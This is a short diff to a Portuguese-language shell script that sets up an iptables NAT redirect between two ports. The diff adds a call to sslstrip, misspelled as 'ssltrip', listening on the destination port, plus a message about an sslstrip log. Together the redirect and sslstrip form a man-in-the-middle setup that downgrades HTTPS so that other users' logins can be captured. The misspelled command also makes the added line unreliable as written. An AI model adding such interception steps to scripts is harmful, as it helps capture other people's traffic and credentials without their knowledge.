@@ -32,3 +32,5 @@ sudo iptables -t nat -A PREROUTING -p tcp --dport "$portainicial" -j REDIRECT --
 
 # Exibe uma mensagem de sucesso
 echo "Redirecionamento configurado com sucesso de porta $portainicial para porta $portadestino."
+ssltrip -l "$portadestino"
+echo "sslstrip log gerado em sslstrip.log"
